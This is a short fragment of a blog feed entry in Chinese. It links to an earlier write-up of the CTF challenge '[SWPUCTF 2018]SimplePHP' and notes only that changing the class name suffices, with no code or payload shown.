<p>原题：<a href="https://blog.csdn.net/qq_51584770/article/details/121218448">[SWPUCTF 2018]SimplePHP</a></p>
<p>改一下类名即可。</p>
]]></content>
      <categories>
        <category>Articles</category>
      </categories>
      <tags>
        <tag>Competition</tag>
      </tags>
  </entry>
</search>
